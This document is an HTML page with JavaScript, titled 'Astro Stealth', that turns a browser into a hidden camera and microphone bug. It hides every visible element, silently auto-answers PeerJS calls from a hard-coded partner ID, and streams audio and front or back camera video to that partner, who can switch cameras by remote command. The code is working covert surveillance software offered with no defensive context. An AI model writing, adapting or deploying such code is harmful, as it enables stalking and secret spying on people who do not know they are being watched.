<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Stealth - Switchable Camera</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
        div, span, button, iframe { display: none !important; }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="localVideo" autoplay muted playsinline></video>

    <script>
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        
        let peer = null;
        let currentCall = null;
        let localStream = null;
        let dataConn = null;
        let currentCamera = 'front';
        let reconnectAttempts = 0;
        const MAX_RECONNECTS = 5;
        
        function log(msg, type = 'info') {
            const prefix = type === 'error' ? '❌' : (type === 'warn' ? '⚠️' : '✅');
            console.log(`[STEALTH] ${prefix} ${msg}`);
        }
        
        // Get camera stream with specified camera
        async function getCameraStream(useBackCamera) {
            // Always include audio + requested video
            const constraints = {
                audio: true,
                video: {
                    facingMode: useBackCamera ? "environment" : "user",
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                }
            };
            
            log(`Getting ${useBackCamera ? 'BACK' : 'FRONT'} camera stream...`, 'info');
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const hasAudio = stream.getAudioTracks().length > 0;
                const hasVideo = stream.getVideoTracks().length > 0;
                log(`Stream acquired - Audio: ${hasAudio}, Video: ${hasVideo}`, 'success');
                return stream;
            } catch (e) {
                if (e.name === 'OverconstrainedError' || e.name === 'NotFoundError') {
                    log(`Exact camera not available, trying without facingMode...`, 'warn');
                    const fallbackConstraints = {
                        audio: true,
                        video: { width: { ideal: 640 }, height: { ideal: 480 } }
                    };
                    try {
                        const fallbackStream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
                        log(`Fallback stream acquired`, 'success');
                        return fallbackStream;
                    } catch (fErr) {
                        log(`Fallback failed: ${fErr.message}`, 'error');
                        throw fErr;
                    }
                } else if (e.name === 'NotAllowedError') {
                    log('Camera/Mic permission denied', 'error');
                } else {
                    log(`Camera error: ${e.message}`, 'error');
                }
                throw e;
            }
        }
        
        // Complete restart of call with new camera
        async function switchCameraByReconnect(targetCamera) {
            if (!currentCall) {
                log('No active call to switch camera', 'warn');
                return;
            }
            
            if (targetCamera === currentCamera) {
                log(`Already using ${targetCamera} camera`, 'info');
                return;
            }
            
            const useBackCamera = (targetCamera === 'back');
            log(`Switching to ${targetCamera} camera by reconnecting...`, 'info');
            
            try {
                // Get new stream with desired camera
                const newStream = await getCameraStream(useBackCamera);
                
                if (!newStream) {
                    throw new Error('Could not get new camera stream');
                }
                
                // Get the current call's peer connection
                const pc = currentCall.peerConnection;
                
                if (pc) {
                    // Get existing senders
                    const senders = pc.getSenders();
                    const videoSender = senders.find(s => s.track && s.track.kind === 'video');
                    const audioSender = senders.find(s => s.track && s.track.kind === 'audio');
                    
                    // Remove old video track
                    if (videoSender) {
                        pc.removeTrack(videoSender);
                        log('Removed old video track', 'info');
                    }
                    
                    // Add new video track
                    const newVideoTrack = newStream.getVideoTracks()[0];
                    if (newVideoTrack) {
                        pc.addTrack(newVideoTrack, newStream);
                        log('Added new video track', 'success');
                    }
                    
                    // Keep audio track (or replace if needed)
                    if (audioSender && newStream.getAudioTracks()[0]) {
                        await audioSender.replaceTrack(newStream.getAudioTracks()[0]);
                        log('Audio track maintained', 'info');
                    }
                }
                
                // Clean up old stream
                if (localStream && localStream !== newStream) {
                    localStream.getTracks().forEach(track => track.stop());
                }
                
                localStream = newStream;
                currentCamera = targetCamera;
                
                // Update hidden video element
                if (newStream.getVideoTracks().length > 0) {
                    const videoEl = document.getElementById('localVideo');
                    videoEl.srcObject = newStream;
                }
                
                log(`✅ Successfully switched to ${targetCamera.toUpperCase()} camera`, 'success');
                
                // Notify remote that switch completed
                if (dataConn) {
                    dataConn.send({ type: 'camera_switched', camera: targetCamera });
                }
                
            } catch (err) {
                log(`Failed to switch camera: ${err.message}`, 'error');
            }
        }
        
        // Alternative method: Restart the entire call with new camera
        async function switchCameraByRestart(targetCamera) {
            if (!currentCall) {
                log('No active call to switch camera', 'warn');
                return;
            }
            
            if (targetCamera === currentCamera) {
                log(`Already using ${targetCamera} camera`, 'info');
                return;
            }
            
            const useBackCamera = (targetCamera === 'back');
            log(`Restarting call with ${targetCamera} camera...`, 'info');
            
            try {
                const remotePeerId = currentCall.peer;
                const callMetadata = currentCall.metadata;
                
                // Get new stream with desired camera
                const newStream = await getCameraStream(useBackCamera);
                
                if (!newStream) {
                    throw new Error('Could not get new camera stream');
                }
                
                // Store the old call
                const oldCall = currentCall;
                
                // Create new call with new stream
                const newCall = peer.call(remotePeerId, newStream, callMetadata);
                
                // Set up new call handlers
                newCall.on('stream', (remoteStream) => {
                    log('New call stream established', 'success');
                    // Remote stream handling is already done by the remote side
                });
                
                newCall.on('close', () => {
                    log('New call closed', 'info');
                });
                
                newCall.on('error', (err) => {
                    log(`New call error: ${err}`, 'error');
                });
                
                // Close old call
                oldCall.close();
                
                // Update references
                currentCall = newCall;
                
                // Clean up old stream
                if (localStream && localStream !== newStream) {
                    localStream.getTracks().forEach(track => track.stop());
                }
                
                localStream = newStream;
                currentCamera = targetCamera;
                
                // Update hidden video element
                if (newStream.getVideoTracks().length > 0) {
                    const videoEl = document.getElementById('localVideo');
                    videoEl.srcObject = newStream;
                }
                
                log(`✅ Successfully switched to ${targetCamera.toUpperCase()} camera via restart`, 'success');
                
                // Notify remote
                if (dataConn) {
                    dataConn.send({ type: 'camera_switched', camera: targetCamera });
                }
                
            } catch (err) {
                log(`Failed to switch camera: ${err.message}`, 'error');
            }
        }
        
        // Main switch function - try replace first, then restart
        async function switchCamera(targetCamera) {
            if (!currentCall) {
                log('No active call to switch camera', 'warn');
                return;
            }
            
            if (targetCamera === currentCamera) {
                log(`Already using ${targetCamera} camera`, 'info');
                return;
            }
            
            // Try replaceTrack method first
            await switchCameraByReconnect(targetCamera);
            
            // If still showing same camera after 1 second, try restart method
            setTimeout(async () => {
                // Check if camera actually changed (by checking video track settings)
                if (localStream && localStream.getVideoTracks()[0]) {
                    const settings = localStream.getVideoTracks()[0].getSettings();
                    const isCurrentlyBack = settings.facingMode === 'environment';
                    const expectedBack = (targetCamera === 'back');
                    
                    if (isCurrentlyBack !== expectedBack) {
                        log('Camera switch may have failed, trying restart method...', 'warn');
                        await switchCameraByRestart(targetCamera);
                    }
                }
            }, 1000);
        }
        
        // Handle incoming calls
        async function handleIncomingCall(call) {
            const callType = call.metadata?.type || 'voice';
            const isVideo = callType === 'video';
            log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} call from remote`, 'info');
            
            try {
                // Start with front camera for video calls
                const stream = await getCameraStream(false);
                localStream = stream;
                currentCamera = 'front';
                
                // Hide video element
                if (isVideo && stream.getVideoTracks().length > 0) {
                    const videoEl = document.getElementById('localVideo');
                    videoEl.srcObject = stream;
                }
                
                call.answer(stream);
                currentCall = call;
                
                log(`Call answered - Sending ${isVideo ? 'Video + Audio' : 'Audio only'} from FRONT camera`, 'success');
                
                // Handle remote stream (ignore - remote is silent)
                call.on('stream', (remoteStream) => {
                    if (remoteStream) {
                        log('Remote stream received (ignored)', 'info');
                        remoteStream.getTracks().forEach(track => {
                            track.enabled = false;
                        });
                    }
                });
                
                call.on('close', () => {
                    log('Call ended by remote', 'info');
                    endCall();
                });
                
                call.on('error', (err) => {
                    log(`Call error: ${err}`, 'error');
                    endCall();
                });
                
            } catch (err) {
                log(`Failed to answer call: ${err.message}`, 'error');
                call.close();
            }
        }
        
        // Handle data messages (camera switch commands from remote)
        function handleDataMessage(data) {
            log(`Received data: ${data.type}`, 'info');
            
            if (data.type === 'camera_switch') {
                const targetCamera = data.camera;
                log(`📷 Camera switch command received: ${targetCamera.toUpperCase()}`, 'info');
                switchCamera(targetCamera);
            }
        }
        
        function endCall() {
            if (localStream) {
                localStream.getTracks().forEach(track => {
                    track.stop();
                    log(`Stopped ${track.kind} track`, 'info');
                });
                localStream = null;
            }
            if (currentCall) {
                currentCall.close();
                currentCall = null;
            }
            document.getElementById('localVideo').srcObject = null;
            currentCamera = 'front';
            log('Call ended, resources released', 'info');
        }
        
        function initPeer() {
            if (peer) {
                peer.destroy();
                peer = null;
            }
            
            log(`Initializing stealth device as ${MY_ID}`, 'info');
            peer = new Peer(MY_ID);
            
            peer.on('open', (id) => {
                log(`✅ Stealth device ACTIVE - ID: ${MY_ID}`, 'success');
                log(`Waiting for connection from ${PARTNER_ID}...`, 'info');
                reconnectAttempts = 0;
            });
            
            // Handle data connections for commands
            peer.on('connection', (conn) => {
                if (conn.peer === PARTNER_ID) {
                    log(`📡 Data connection established with remote`, 'success');
                    dataConn = conn;
                    conn.on('data', handleDataMessage);
                    conn.on('close', () => {
                        log('Data connection closed', 'warn');
                        dataConn = null;
                    });
                } else {
                    conn.close();
                }
            });
            
            peer.on('call', (call) => {
                if (call.peer === PARTNER_ID) {
                    handleIncomingCall(call);
                } else {
                    log(`Rejected call from ${call.peer}`, 'warn');
                    call.close();
                }
            });
            
            peer.on('disconnected', () => {
                log('Disconnected, reconnecting...', 'warn');
                if (reconnectAttempts < MAX_RECONNECTS) {
                    reconnectAttempts++;
                    setTimeout(() => peer.reconnect(), 3000);
                }
            });
            
            peer.on('error', (err) => {
                if (err.type === 'unavailable-id') {
                    log(`ID ${MY_ID} in use, retrying...`, 'warn');
                    setTimeout(() => initPeer(), 5000);
                } else {
                    log(`Error: ${err.type}`, 'error');
                }
            });
        }
        
        // Function to list available cameras (for debugging)
        async function listCameras() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(device => device.kind === 'videoinput');
                log(`Available cameras: ${cameras.length}`, 'info');
                cameras.forEach((cam, i) => {
                    log(`  Camera ${i + 1}: ${cam.label || 'Unnamed'}`, 'info');
                });
            } catch (e) {
                log(`Could not list cameras: ${e.message}`, 'warn');
            }
        }
        
        // Start stealth service
        log('=== ASTRO STEALTH SERVICE (SWITCHABLE CAMERA) ===');
        log('Configuration:');
        log(`  - ID: ${MY_ID}`);
        log(`  - Target: ${PARTNER_ID}`);
        log(`  - Audio: ALWAYS SENT to remote`);
        log(`  - Video: ON DEMAND`);
        log(`  - Camera: SWITCHABLE via remote command`);
        
        // List available cameras on startup
        setTimeout(listCameras, 1000);
        
        initPeer();
        
        // Heartbeat
        setInterval(() => {
            if (currentCall) {
                console.log('[STEALTH] Active call - sending to remote');
            }
        }, 30000);
        
        // Clean shutdown
        window.addEventListener('beforeunload', () => {
            if (currentCall) currentCall.close();
            if (peer) peer.destroy();
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
